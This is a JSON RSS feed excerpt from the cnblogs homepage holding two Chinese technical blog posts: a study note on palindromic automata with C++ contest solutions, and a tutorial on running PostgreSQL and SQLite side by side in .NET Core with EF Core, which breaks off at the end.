{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "回文自动机 PAM 学习笔记",
      "link": "https://www.cnblogs.com/xzyNOIP/p/19567406",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xzyNOIP/p/19567406\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 09:32\">\n    <span>回文自动机 PAM 学习笔记</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"回文自动机\">回文自动机</h2>\n<p>zeb 于 2026.2.2 讲解，做一个笔记。</p>\n<h3 id=\"1-引入\">1. 引入</h3>\n<p>回文树，或者说，回文自动机 PAM（Palindromic Automaton），是一种可以存储一个串中<strong>所有本质不同回文子串</strong>的数据结构。</p>\n<p>由于这个算法就是从其它字符串相关自动机借鉴而来，因此于其它自动机有许多相似之处。在这个回文自动机中，每一个状态（即节点）都对应了原串中的一个子串。而不同的是，转移边上的字符，指的是在原状态上两侧分别加上一个这个字符，所形成的回文子串。</p>\n<p>例如</p>\n<p><img alt=\"\" src=\"https://cdn.luogu.com.cn/upload/image_hosting/5vme40l0.png\" /></p>\n<p>你就会发现一个问题，我们这样只能得到偶数长度的子串，那该怎么办呢？也像 <span class=\"math inline\">\\(\\text{Manacher}\\)</span> 那样加入间隔字符？</p>\n<p>我们考虑一个巧妙而快捷的方法——我们建两棵根，一个是<strong>奇根</strong>，下面挂所有长度为奇数的回文子串；一个是<strong>偶根</strong>，下面挂所有长度为偶数的回文子串。</p>\n<h3 id=\"2-构造\">2. 构造</h3>\n<p>对每个状态，我们会储存以下内容：</p>\n<ul>\n<li>对应字符串长度 <span class=\"math inline\">\\(\\mathtt{len_u}\\)</span>；</li>\n<li>对应字符串所有出边指向的结点 <span class=\"math inline\">\\(\\mathtt{trie_{u,c}}\\)</span>；</li>\n<li>状态的失配指针 <span class=\"math inline\">\\(\\mathtt{fail_u}\\)</span>（含义在下文）。</li>\n</ul>\n<p>对于奇根和偶根，我们分别定义它们的长度为 <span class=\"math inline\">\\(-1\\)</span> 和 <span class=\"math inline\">\\(0\\)</span>。这样可以保持统一性，在一个状态后加入一个后继状态时，它所对应的长度就直接设为它父亲长度加 <span class=\"math inline\">\\(2\\)</span> 即可。</p>\n<p>对于 <span class=\"math inline\">\\(\\text{PAM}\\)</span> 的构造，我们类似于 <span class=\"math inline\">\\(\\text{SAM}\\)</span> 采用<strong>增量构造</strong>，即每加入一个字符，我们都可以实时更新这个回文自动机。</p>\n<p>那么，不妨设我们现在要加入的这个点是第 <span class=\"math inline\">\\(i\\)</span> 个字符，前 <span class=\"math inline\">\\(i-1\\)</span> 个字符对应的 <span class=\"math inline\">\\(\\text{PAM}\\)</span> 已经构造好。</p>\n<p>我们考虑加入这个字符串会产生的新的回文子串，即以第 <span class=\"math inline\">\\(i\\)</span> 位为结尾的回文子串。在这么多的回文子串中，我们每个都要新建节点吗？并非，事实上，我们只需要新建<strong>最长的一个后缀回文子串</strong>对应状态即可。因为可以保证，比它短的以前一定已经出现过了，比如说这个例子：</p>\n<p>对于子串 <span class=\"math inline\">\\(\\mathtt{abaccaba}\\)</span>，后缀回文子串共有三个，<span class=\"math inline\">\\(\\mathtt{abaccaba,aba,a}\\)</span>。</p>\n<p>其中你会发现，如果一个后缀回文子串不是最长的，那么它一定可以被最长的那一个后缀回文子串<strong>翻转过去</strong>，比如说这里的 <span class=\"math inline\">\\(\\mathtt{aba}\\)</span>，就可以通过整个子串找到一个对称位置上同样的 <span class=\"math inline\">\\(\\mathtt{aba}\\)</span>，这也就是为什么我们至多只需要新建最长回文后缀对应节点就可以了。</p>\n<p>现在我们的任务，就是找到这个新节点该建立在哪里。你会发现，这个节点的父亲，即将这个最长回文后缀掐头去尾，一定也是一个回文串，且就是 <span class=\"math inline\">\\(i-1\\)</span> 位置上的一个后缀回文子串。于是这个任务就转化成了，找到一个对应子串最长的节点 <span class=\"math inline\">\\(u\\)</span> 满足</p>\n<ul>\n<li>它对应的子串是 <span class=\"math inline\">\\(i-1\\)</span> 的一个后缀回文子串；</li>\n<li><span class=\"math inline\">\\(s_{i-\\mathtt{len_u}-1}=s_i\\)</span>。</li>\n</ul>\n<p>我们记录 <span class=\"math inline\">\\(i-1\\)</span> 位置最长回文后缀对应状态节点编号为 <span class=\"math inline\">\\(\\mathtt{last}\\)</span>。如果这个节点已经满足这个条件了，很好，我们直接把新节点连在 <span class=\"math inline\">\\(\\mathtt{last}\\)</span> 下面即可。但如果不行呢？因此，我们这里类似 <span class=\"math inline\">\\(\\text{ACAM}\\)</span>，引入 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 失配指针。<span class=\"math inline\">\\(\\mathtt{fail_u}\\)</span> 表示的含义是，状态 <span class=\"math inline\">\\(u\\)</span> 对应的回文子串的<strong>最长回文后缀</strong>对应的状态。</p>\n<p>那么可以发现，<span class=\"math inline\">\\(\\mathtt{last},\\mathtt{fail_{last}},\\mathtt{fail_{fail_{last}}},\\dots\\)</span> 就对应了以 <span class=\"math inline\">\\(i-1\\)</span> 结尾的所有后缀回文子串！</p>\n<p>因此在这里，我们只需要不断往上跳 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 指针即可。那么如果一直找都找不到，怎么办？这时候我们考虑把偶根的 <span class=\"math inline\">\\(\\mathtt{fail_0}\\)</span> 连到奇根上去。这样跳 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 时，由于奇根的 <span class=\"math inline\">\\(\\mathtt{len_1}=-1\\)</span>，因此 <span class=\"math inline\">\\(i-\\mathtt{len_1}-1=i\\)</span>，即对于 <span class=\"math inline\">\\(s_i\\)</span> 这个单字符的回文串，二条件一定成立，很自然的就会连到奇根下面。这一方面揭示了设奇根长度为 <span class=\"math inline\">\\(-1\\)</span> 的另一好处，同时也说明了，为什么 <span class=\"math inline\">\\(\\mathtt{fail_0}\\leftarrow 1\\)</span>。</p>\n<p>那么找到了父亲，我们接下来就是要为这一点也连一条 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 指针出去。</p>\n<p>其实也很简单，这条 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 指针，连向的其实就是以 <span class=\"math inline\">\\(i\\)</span> 结尾的第二长的回文后缀。那么我们只需要继续从 <span class=\"math inline\">\\(\\mathtt{fail_{last}}\\)</span> 开始跳，再找到第一个符合二条件的就可以了。</p>\n<p>下面是实现。</p>\n<pre><code class=\"language-cpp\">int last,tot=1,fail[N],len[N],trie[N][30];\n//last 最开始挂在偶根\n//tot 记得要赋初值为 1\nint getfail(int u,int id){\n    while(s[id]!=s[id-len[u]-1]) u=fail[u]; //不满足二条件就一直跳\n    return u;\n}\nvoid pamConstruct(){\n    fail[0]=1,len[1]=-1;\n    //初始化 偶根的 fail 指向奇根，奇根的长度为 -1\n    for(int i=1;i&lt;=n;i++){\n\t\tint fa=getfail(last,i);\n        //找到 i-1 的回文后缀中最长的那个符合二条件的，作为其父亲\n\t\tif(!trie[fa][s[i]-'a']){\n\t\t\tfail[++tot]=trie[getfail(fail[fa],i)][s[i]-'a'];\n            //从 fail[fa] 开始，是因为我们找的是真后缀\n\t\t\ttrie[fa][s[i]-'a']=tot;\n            //先找 fail 再连边！！\n\t\t\tlen[tot]=len[fa]+2;\n\t\t}\n\t\tlast=trie[fa][s[i]-'a'];\n\t}\n}\n</code></pre>\n<p>有关复杂度，首先，由代码也可以看出，状态最多只有 <span class=\"math inline\">\\(n\\)</span> 个，因此空间复杂度是 <span class=\"math inline\">\\(O(n\\Sigma)\\)</span> 的。</p>\n<p>时间复杂度，首先除了跳 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 都是 <span class=\"math inline\">\\(O(n)\\)</span> 的。</p>\n<p>每次跳 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 时，每一条 Fail 边至多被经过一次，而增添 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 指针时，最多新添一条 Fail 边。因此跳 <span class=\"math inline\">\\(\\text{Fail}\\)</span> 的次数至多就是 <span class=\"math inline\">\\(O(n)\\)</span> 的，因此总时间复杂度是 <span class=\"math inline\">\\(O(n)\\)</span>。</p>\n<h3 id=\"3-应用\">3. 应用</h3>\n<p><strong>求以某位置结尾的回文子串个数，强制在线</strong></p>\n<p>即 P5496，分析一下，其实就是它在 Fail 树上的深度嘛。</p>\n<p>代码</p>\n<pre><code class=\"language-cpp\">const int N=5e5+10;\nstring s;\nint n,lastans;\nint last,tot=1,fail[N],len[N],trie[N][30];\nint dep[N];\nint getfail(int u,int id){\n\twhile(s[id]!=s[id-len[u]-1]) u=fail[u];\n\treturn u;\n}\nint main(){\n\tios::sync_with_stdio(false);\n\tcin.tie(0);cout.tie(0);\n\tcin&gt;&gt;s; n=s.length();\n\ts=\" \"+s;\n\tfail[0]=1,len[1]=-1;\n\tfor(int i=1;i&lt;=n;i++){\n\t\ts[i]=(s[i]-97+lastans)%26+97;\n\t\tint fa=getfail(last,i);\n\t\tif(!trie[fa][s[i]-'a']){\n\t\t\tfail[++tot]=trie[getfail(fail[fa],i)][s[i]-'a'];\n\t\t\ttrie[fa][s[i]-'a']=tot;\n\t\t\tlen[tot]=len[fa]+2;\n\t\t\tdep[tot]=dep[fail[tot]]+1;\n\t\t}\n\t\tlast=trie[fa][s[i]-'a'];\n\t\tlastans=dep[last];\n\t\tcout&lt;&lt;lastans&lt;&lt;\" \";\n\t}\n\tcout&lt;&lt;\"\\n\";\n\treturn 0;\n}\n</code></pre>\n<p><strong>求某个回文子串的出现次数</strong></p>\n<p>你会发现在 Fail 树上，一个状态的后代所对应的子串全都包含它。因此我们记录 <span class=\"math inline\">\\(\\mathtt{cnt_u}\\)</span> 表示 <span class=\"math inline\">\\(u\\)</span> 状态在构建时被抵达了多少次，最后一个节点答案就应该是子树和。</p>\n<p>P3649 代码如下</p>\n<pre><code class=\"language-cpp\">const int N=3e5+10;\nstring s;\nint n;\nll ans;\nint tot=1,last,len[N],siz[N],fail[N],trie[N][30];\nvector&lt;int&gt; T[N];\nint getfail(int u,int id){\n\twhile(s[id]!=s[id-len[u]-1]) u=fail[u];\n\treturn u;\n}\nvoid dfs(int u){\n\tfor(auto v:T[u]) dfs(v),siz[u]+=siz[v];\n\tans=max(ans,1ll*len[u]*siz[u]);\n}\nint main(){\n\tios::sync_with_stdio(false);\n\tcin.tie(0);cout.tie(0);\n\tcin&gt;&gt;s; n=s.length();\n\ts=\" \"+s;\n\tlen[1]=-1,fail[0]=1;\n\tT[1].push_back(0);\n\tfor(int i=1;i&lt;=n;i++){\n\t\tint fa=getfail(last,i);\n\t\tif(!trie[fa][s[i]-'a']){\n\t\t\tfail[++tot]=trie[getfail(fail[fa],i)][s[i]-'a'];\n\t\t\tT[fail[tot]].push_back(tot);\n\t\t\ttrie[fa][s[i]-'a']=tot;\n\t\t\tlen[tot]=len[fa]+2;\n\t\t}\n\t\tlast=trie[fa][s[i]-'a'];\n\t\tsiz[last]++;\n\t}\n\tdfs(1);\n\tcout&lt;&lt;ans&lt;&lt;\"\\n\";\n\treturn 0;\n}\n</code></pre>\n<p><strong>前端插入</strong></p>\n<p>是的，<span class=\"math inline\">\\(\\text{PAM}\\)</span> 支持前端插入，这得益于回文串良好的对称性质。</p>\n<p>假设我们要在位置 <span class=\"math inline\">\\(l\\)</span> 新增一个字符，我们就要找到 <span class=\"math inline\">\\(l+1\\)</span> 的最长回文前缀中，第一个合法的。那我们要额外建立另一颗 Fail 树吗？并不用，因为你会发现一个回文串的回文前缀，一定也是这个回文串的回文后缀，因此 Fail 完全可以共用。</p>\n<p>唯一要改变的是，我们原先是一个 <span class=\"math inline\">\\(\\mathtt{last}\\)</span>，在这里我们要用两个，<span class=\"math inline\">\\(\\mathtt{pre}\\)</span> 和 <span class=\"math inline\">\\(\\mathtt{suf}\\)</span>，分别表示 <span class=\"math inline\">\\(l\\)</span> 最长回文前缀对应的状态，和 <span class=\"math inline\">\\(r\\)</span> 最长回文后缀对应的状态。什么时候两者可能会相互影响呢？你会发现，只有当整个串都变成了一个回文串，两者就会相互影响了，此时要将它们统一设成最后一个状态。</p>\n<p>HDU5421 代码如下。</p>\n<pre><code class=\"language-cpp\">const int N=2e5+10;\nchar s[N];\nint q,L,R;\nll ans;\nint tot,fail[N],trie[N][30],len[N],dep[N];\nint pre,suf;\nvoid init(){\n\ttot=1,ans=0;\n\tpre=0,suf=0;\n\tL=1e5+1,R=L-1;\n\tmemset(fail,0,sizeof(fail));\n\tmemset(trie,0,sizeof(trie));\n\tmemset(len,0,sizeof(len));\n\tmemset(dep,0,sizeof(dep));\n\tmemset(s,0,sizeof(s));\n\tfail[0]=1,len[1]=-1;\n}\nint getfail(int u,int id,int op){\n\twhile(s[id]!=s[id-op*(len[u]+1)]) u=fail[u];\n\treturn u;\n}\nvoid insert(char c,int pos,int &amp;last,int op){\n\tint fa=getfail(last,pos,op);\n\tif(!trie[fa][c-'a']){\n\t\tfail[++tot]=trie[getfail(fail[fa],pos,op)][c-'a'];\n\t\ttrie[fa][c-'a']=tot;\n\t\tlen[tot]=len[fa]+2,dep[tot]=dep[fail[tot]]+1;\n\t}\n\tlast=trie[fa][c-'a'];\n\tans+=dep[last];\n\tif(len[last]==R-L+1) pre=suf=last;\n}\nint main(){\n\tios::sync_with_stdio(false);\n\tcin.tie(0);cout.tie(0);\n\twhile(cin&gt;&gt;q){\n\t\tinit();\n\t\twhile(q--){\n\t\t\tint op; char c;\n\t\t\tcin&gt;&gt;op;\n\t\t\tif(op==1){\n\t\t\t\tcin&gt;&gt;c; s[--L]=c;\n\t\t\t\tinsert(c,L,pre,-1);\n\t\t\t}\n\t\t\telse if(op==2){\n\t\t\t\tcin&gt;&gt;c; s[++R]=c;\n\t\t\t\tinsert(c,R,suf,1);\n\t\t\t}\n\t\t\telse if(op==3) cout&lt;&lt;tot-1&lt;&lt;\"\\n\";\n\t\t\telse cout&lt;&lt;ans&lt;&lt;\"\\n\";\n\t\t}\n\t}\n\treturn 0;\n}\n\n</code></pre>\n<p><strong>回文自动机上 dp</strong></p>\n<p>一道例题：P4762 Virus synthesis</p>\n<blockquote>\n<p>初始有一个空串，利用下面的操作构造定串 <span class=\"math inline\">\\(S\\)</span>。</p>\n<ul>\n<li>串开头或末尾添加一个字符；</li>\n<li>翻转字符串，添加到在开头或末尾。</li>\n</ul>\n<p>求最小的操作数，<span class=\"math inline\">\\(|S|\\le 10^5\\)</span>，字符集为 <span class=\"math inline\">\\(\\{A,T,C,G \\}\\)</span>。</p>\n</blockquote>\n<p>可以先去玩一下样例。</p>\n<p>二操作是一个很好的东西，它可以减省很多时间。因此，我们考虑<strong>最后一次使用二操作</strong>所形成的字符串，设其所需操作次数为 <span class=\"math inline\">\\(f(T)\\)</span>，那么剩下的暴力操作非常好计算，总次数就是 <span class=\"math inline\">\\(n-|T|+f(T)\\)</span>，在所有偶回文子串中选一个最小的就可以了，这些回文子串都可以在 <span class=\"math inline\">\\(\\text{PAM}\\)</span> 上存储。问题转化为如何计算一个偶回文子串的最小操作次数。</p>\n<p>首先对于这个偶回文子串，最后一步<strong>一定是翻转</strong>，没的说。考虑怎么转移来。</p>\n<ul>\n<li>从同心的回文子串转移来：即从其在 <span class=\"math inline\">\\(\\text{PAM}\\)</span> 上的父亲的操作次数加一，<span class=\"math inline\">\\(f(\\mathtt{fa_u})+1\\)</span>；</li>\n<li>从不同心的回文子串转移来：我们跳 Fail 链，找到第一个 <span class=\"math inline\">\\(\\mathtt{len}\\)</span> 值小于等于当前串一半的，设这个为 <span class=\"math inline\">\\(\\mathtt{trans_u}\\)</span>，答案就是 <span class=\"math inline\">\\(f(\\mathtt{trans_u})+\\dfrac {\\mathtt{len_u}}{2}-\\mathtt{len_{trans_u}}+1\\)</span>。</li>\n</ul>\n<p>求 <span class=\"math inline\">\\(\\mathtt{trans}\\)</span> 的方法与 Fail 树类似。时间复杂度 <span class=\"math inline\">\\(O(n)\\)</span>。</p>\n<pre><code class=\"language-cpp\">const int N=1e5+10;\nstring s;\nint n;\nint tot,trie[N][4],len[N],fail[N];\nint trans[N];\nint dp[N];\nint last;\nint getid(char c){\n\tif(c=='A') return 0;\n\telse if(c=='G') return 1;\n\telse if(c=='C') return 2;\n\telse return 3;\n}\nint getfail(int u,int id){\n\twhile(s[id]!=s[id-len[u]-1]) u=fail[u];\n\treturn u;\n}\nvoid solve(){\n\tcin&gt;&gt;s; n=s.length();\n\tfor(int i=0;i&lt;=n;i++) dp[i]=INF;\n    //注意 dp 值初始都设为极大\n\ts=\" \"+s;\n\ttot=1,last=0;\n\tlen[1]=-1,fail[0]=1;\n\tint ans=n;\n\tdp[0]=1; //先把翻转的代价算上，不然像转移一那种就计算不到\n\tfor(int i=1;i&lt;=n;i++){\n\t\tint fa=getfail(last,i);\n\t\tif(!trie[fa][getid(s[i])]){\n\t\t\tfail[++tot]=trie[getfail(fail[fa],i)][getid(s[i])];\n\t\t\ttrie[fa][getid(s[i])]=tot;\n\t\t\tlen[tot]=len[fa]+2;\n            //下面求 trans\n\t\t\tif(len[tot]&lt;=2) trans[tot]=fail[tot];\n\t\t\telse if(len[tot]%2==0){\n\t\t\t\tint tmp=trans[fa];// 很重要 保证时间复杂度\n                // 这样可以保证 Fail 边不会被大量重复走过\n\t\t\t\twhile(s[i-1-len[tmp]]!=s[i]||(len[tmp]+2)*2&gt;len[tot]) tmp=fail[tmp];\n\t\t\t\ttrans[tot]=trie[tmp][getid(s[i])];\n\t\t\t}\n\t\t\tif(len[tot]%2==0){\n\t\t\t\tdp[tot]=min(dp[fa]+1,dp[trans[tot]]+len[tot]/2-len[trans[tot]]+1);\n\t\t\t\tans=min(ans,dp[tot]+n-len[tot]);\n\t\t\t}\n\t\t}\n\t\tlast=trie[fa][getid(s[i])];\n\t}\n\tcout&lt;&lt;ans&lt;&lt;\"\\n\"; \n\tfor(int i=0;i&lt;=tot;i++){\n\t\tfor(int j=0;j&lt;4;j++) trie[i][j]=0;\n\t}\n}\n</code></pre>\n<p>参考文章</p>\n<ul>\n<li>\n<p><a href=\"https://www.luogu.com.cn/article/ntc6yyfd\" rel=\"noopener nofollow\" target=\"_blank\">PAM 题解 by 功在不舍</a></p>\n</li>\n<li>\n<p><a href=\"https://oi-wiki.org/string/pam/\" rel=\"noopener nofollow\" target=\"_blank\">oi-wiki</a></p>\n</li>\n<li>\n<p><a href=\"https://www.luogu.com.cn/user/387585\" rel=\"noopener nofollow\" target=\"_blank\">来自 zeb 的讲解</a></p>\n</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 09:32</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xzyNOIP\">xzy_sf</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": ".NET Core 双数据库实战：优雅融合 PostgreSQL 与 SQLite 的最佳实践",
      "link": "https://www.cnblogs.com/newbe36524/p/19567317",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/newbe36524/p/19567317\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 09:11\">\n    <span>.NET Core 双数据库实战：优雅融合 PostgreSQL 与 SQLite 的最佳实践</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"net-core-双数据库实战让-postgresql-与-sqlite-和平共处\">.NET Core 双数据库实战：让 PostgreSQL 与 SQLite 和平共处</h1>\n<blockquote>\n<p>在构建现代化应用时，我们经常面临这样的抉择：开发环境渴望轻量便捷，而生产环境则需要高并发与高可用。本文将分享如何在 .NET Core 项目中优雅地同时支持 PostgreSQL 和 SQLite，实现“开发用 SQLite，生产用 PG”的最佳实践。</p>\n</blockquote>\n\n<h2 id=\"背景\">背景</h2>\n<p>在软件开发中，环境差异化一直是困扰开发团队的难题之一。以我们正在构建的 <strong>HagiCode</strong> 平台为例，这是一个基于 ASP.NET Core 10 和 React 的 AI 辅助开发系统，内部集成了 Orleans 进行分布式状态管理，技术栈相当现代且复杂。</p>\n<p>在项目初期，我们遇到了一个典型的工程痛点：开发人员希望本地环境能够“开箱即用”，不希望安装和配置繁重的 PostgreSQL 数据库；但在生产环境中，我们需要处理高并发写入和复杂的 JSON 查询，这时轻量级的 SQLite 又显得力不从心。</p>\n<p>如何在保持代码库统一的前提下，让应用既能像客户端软件一样利用 SQLite 的便携性，又能像企业级服务一样发挥 PostgreSQL 的强悍性能？这就是本文要探讨的核心问题。</p>\n<h2 id=\"关于-hagicode\">关于 HagiCode</h2>\n<p>本文分享的双数据库适配方案，直接来源于我们在 <strong>HagiCode</strong> 项目中的实战经验。HagiCode 是一个集成了 AI 提示词管理和 OpenSpec 工作流的下一代开发平台。正是为了兼顾开发者的体验和生产环境的稳定性，我们探索出了这套行之有效的架构模式。</p>\n<p>欢迎访问我们的 GitHub 仓库了解项目全貌：<a href=\"https://github.com/HagiCode-org/site\" rel=\"noopener nofollow\" target=\"_blank\">HagiCode-org/site</a>。</p>\n<h2 id=\"核心内容一架构设计与统一抽象\">核心内容一：架构设计与统一抽象</h2>\n<p>要在 .NET Core 中实现双数据库支持，核心思想是“依赖抽象而非具体实现”。我们需要把数据库的选择权从业务代码中剥离出来，交给配置层决定。</p>\n<h3 id=\"设计思路\">设计思路</h3>\n<ol>\n<li><strong>统一接口</strong>：所有的业务逻辑都应依赖于 <code>DbContext</code> 基类或自定义的接口，而不是具体的 <code>PostgreSqlDbContext</code>。</li>\n<li><strong>配置驱动</strong>：通过 <code>appsettings.json</code> 中的配置项，在应用启动时动态决定加载哪个数据库提供程序。</li>\n<li><strong>特性隔离</strong>：针对 PostgreSQL 特有的功能（如 JSONB）进行适配处理，确保在 SQLite 中也能降级运行。</li>\n</ol>\n<h3 id=\"代码实现动态上下文配置\">代码实现：动态上下文配置</h3>\n<p>在 ASP.NET Core 的 <code>Program.cs</code> 中，我们不应硬编码 <code>UseNpgsql</code> 或 <code>UseSqlite</code>。相反，我们应该读取配置来动态决定。</p>\n<p>首先，定义配置类：</p>\n<pre><code class=\"language-csharp\">public class DatabaseSettings\n{\n    public const string SectionName = \"Database\";\n    \n    // 数据库类型：PostgreSQL 或 SQLite\n    public string DbType { get; set; } = \"PostgreSQL\"; \n    \n    // 连接字符串\n    public string ConnectionString { get; set; } = string.Empty;\n}\n</code></pre>\n<p>然后，在 <code>Program.cs</code> 中根据配置注册服务：</p>\n<pre><code class=\"language-csharp\">// 读取配置\nvar databaseSettings = builder.Configuration.GetSection(DatabaseSettings.SectionName).Get&lt;DatabaseSettings&gt;();\n\n// 注册 DbContext\nbuilder.Services.AddDbContext&lt;ApplicationDbContext&gt;(options =&gt;\n{\n    if (databaseSettings?.DbType?.ToLower() == \"sqlite\")\n    {\n        // SQLite 配置\n        options.UseSqlite(databaseSettings.ConnectionString);\n        \n        // SQLite 的并发写入限制处理\n        // 注意：在生产环境中建议开启 WAL 模式以提高并发性能\n    }\n    else\n    {\n        // PostgreSQL 配置（默认）\n        options.UseNpgsql(databaseSettings.ConnectionString, npgsqlOptions =&gt;\n        {\n            // 开启 JSONB 支持，这在处理 AI 对话记录时非常有用\n            npgsqlOptions.UseJsonNet(); \n        });\n        \n        // 配置连接池重连策略\n        options.EnableRetryOnFailure(3);\n    }\n});\n</code></pre>\n<h2 id=\"核心内容二处理差异性与迁移策略\">核心内容二：处理差异性与迁移策略</h2>\n<p>PostgreSQL 和 SQLite 虽然都支持 SQL 标准，但在具体特性和行为上存在显著差异。如果不处理好这些差异，很可能会出现“本地跑得通，上线就报错”的尴尬情况。</p>\n<h3 id=\"1-json-类型的处理\">1. JSON 类型的处理</h3>\n<p>在 HagiCode 中，我们需要存储大量的提示词和 AI 元数据，这通常涉及 JSON 列。</p>\n<ul>\n<li><strong>PostgreSQL</strong>：拥有原生的 <code>JSONB</code> 类型，查询性能极佳。</li>\n<li><strong>SQLite</strong>：没有原生的 JSON 类型（新版本有 JSON1 扩展，但对象映射上仍有差异），通常存储为 TEXT。</li>\n</ul>\n<p><strong>解决方案</strong>：<br />\n在 EF Core 的实体映射中，我们将其配置为可转换的类型。</p>\n<pre><code class=\"language-csharp\">protected override void OnModelCreating(ModelBuilder modelBuilder)\n{\n    base.OnModelCreating(modelBuilder);\n\n    // 配置实体\n    modelBuilder.Entity&lt;PromptTemplate&gt;(entity =&gt; \n    {\n        entity.Property(e =&gt; e.Metadata)\n              .HasColumnType(\"jsonb\") // PG 使用 jsonb\n              .HasConversion(\n                  v =&gt; JsonSerializer.Serialize(v, (JsonSerializerOptions)null),\n                  v =&gt; JsonSerializer.Deserialize&lt;Dictionary&lt;string, object&gt;&gt;(v, (JsonSerializerOptions)null)\n              ); \n    });\n}\n</code></pre>\n<p>当使用 SQLite 时，虽然 <code>HasColumnType(\"jsonb\")</code> 会被忽略或产生警告，但由于配置了 <code>HasConversion</code>，数据会被正确地序列化和反序列化为字符串存入 TEXT 字段，从而保证了兼容性。</p>\n<h3 id=\"2-迁移策略的分离\">2. 迁移策略的分离</h3>\n<p>绝对不要试图让同一套 Migration 脚本同时适配 PG 和 SQLite。由于主键生成策略、索引语法等的不同，这必然会导致失败。</p>\n<p><strong>推荐实践</strong>：<br />\n维护两个迁移分支或项目。在 HagiCode 的开发流中，我们是这样处理的：</p>\n<ol>\n<li><strong>开发阶段</strong>：主要在 SQLite 下工作。使用 <code>Add-Migration Init_Sqlite -OutputDir Migrations/Sqlite</code>。</li>\n<li><strong>适配阶段</strong>：开发完一段功能后，切换连接字符串指向 PostgreSQL，执行 <code>Add-Migration Init_Postgres -OutputDir Migrations/Postgres</code>。</li>\n<li><strong>自动化脚本</strong>：编写一个简单的 PowerShell 或 Bash 脚本，根据当前环境变量自动应用对应的迁移。</li>\n</ol>\n<pre><code class=\"language-bash\"># 简单的部署逻辑伪代码\nif [ \"$DATABASE_PROVIDER\" = \"PostgreSQL\" ]; then\n    dotnet ef database update --project Migrations.Postgres\nelse\n    dotnet ef database update --project Migrations.Sqlite\nfi\n</code></pre>\n<h2 id=\"核心内容三hagicode-的实战经验总结\">核心内容三：HagiCode 的实战经验总结</h2>\n<p>在将 <strong>HagiCode</strong> 从单一数据库重构为双数据库支持的过程中，我们踩过一些坑，也总结了一些关键的经验，希望能给大家避坑。</p>\n<h3 id=\"1-并发与事务的区别\">1. 并发与事务的区别</h3>\n<p>PostgreSQL 是服务端-客户端架构，支持高并发写入，事务隔离级别非常强大。而 SQLite 是文件锁机制，写入操作会锁定整个数据库文件（除非开启 WAL 模式）。</p>\n<p><strong>建议</strong>：<br />\n在编写涉及频繁写入的业务逻辑时（例如实时保存用户的编辑状态），一定要考虑到 SQLite 的锁机制。在设计 <strong>HagiCode</strong> 的 OpenSpec 协作模块时，我们引入了“写前合并”机制，减少数据库的直接写入频率，从而在两种数据库下都能保持高性能。</p>\n<h3 id=\"2-连接字符串的生命周期管理\">2. 连接字符串的生命周期管理</h3>\n<p>PostgreSQL 的连接建立成本较高，依赖连接池。而 SQLite 连接非常轻量，但如果不及时释放，文件锁可能会导致后续操作超时。</p>\n<p>在 <code>Program.cs</code> 中，我们可以针对不同数据库做精细化调整：</p>\n<pre><code class=\"language-csharp\">if (databaseSettings?.DbType?.ToLower() == \"sqlite\")\n{\n    // SQLite：保持连接开启能提升性能，但要注意文件锁\n    options.UseSqlite(connectionString, sqliteOptions =&gt;\n    {\n        // 设置命令超时时间\n        sqliteOptions.CommandTimeout(30);\n    });\n}\nelse\n{\n    // PG：利用连接池\n    options.UseNpgsql(connectionString, npgsqlOptions =&gt;\n    {\n        npgsqlOptions.MaxBatchSize(100);\n        npgsqlOptions.CommandTimeout(30);\n    });\n}\n</code></pre>\n<h3 id=\"3-测试覆盖的重要性\">3. 测试覆盖的重要性</h3>\n<p>很多开发者（包括我们团队早期的成员）容易犯一个错误：只在开发环境（通常是 SQLite）跑单元测试。</p>\n<p>我们在 HagiCode 的 CI/CD 流水线中强制加入了 GitHub Action 步骤，确保每次 Pull Request 都要跑过 PostgreSQL 的集成测试。</p>\n<pre><code class=\"language-yaml\"># .github/workflows/test.yml 示例片段\n- name: Run Integration Tests (PostgreSQL)\n  run: |\n    docker-compose up -d db_postgres\n    dotnet test --filter \"Category=Integration\"\n</code></pre>\n<p>这帮我们拦截了无数次关于 SQL 语法差异、大小写敏感性的 Bug。</p>\n<h2 id=\"总结\">总结</h2>\n<p>通过引入抽象层和配置驱动的依赖注入，我们在 <strong>HagiCode</strong> 项目中成功实现了 PostgreSQL 和 SQLite 的“双轨制”运行。这不仅极大降低了新开发者的上手门槛（不需要装 PG），也为生产环境提供了坚实的性能保障。</p>\n<p>回顾一下关键点：</p>\n<ol>\n<li><strong>抽象至上</strong>：业务代码不依赖具体数据库实现。</li>\n<li><strong>配置分离</strong>：开发和生产使用不同的 <code>appsettings.json</code>。</li>\n<li><strong>迁移分离</strong>：不要尝试一套 Migration 走天下。</li>\n<li><strong>特性降级</strong>：在 SQLite 中以兼容性优先，在 PostgreSQL 中以性能优先。</li>\n</ol>\n<p>这种架构模式不仅适用于 HagiCode，也适用于任何需要在轻量级开发和重量级生产之间寻找平衡的 .NET 项目。</p>\n<hr 